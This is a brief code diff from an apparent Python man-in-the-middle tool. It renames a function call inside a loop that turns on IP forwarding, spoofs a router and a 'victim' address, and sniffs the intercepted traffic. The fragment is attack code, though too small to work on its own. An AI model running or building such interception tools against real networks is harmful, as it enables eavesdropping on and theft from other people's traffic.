@@ -32,7 +32,7 @@ def MiddleMan():
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     while 1:
         try:
-            spoof(routerIP, victimIP)
+            Spoof(routerIP, victimIP)
             time.sleep(1)
             sniffer()
         except KeyboardInterrupt:
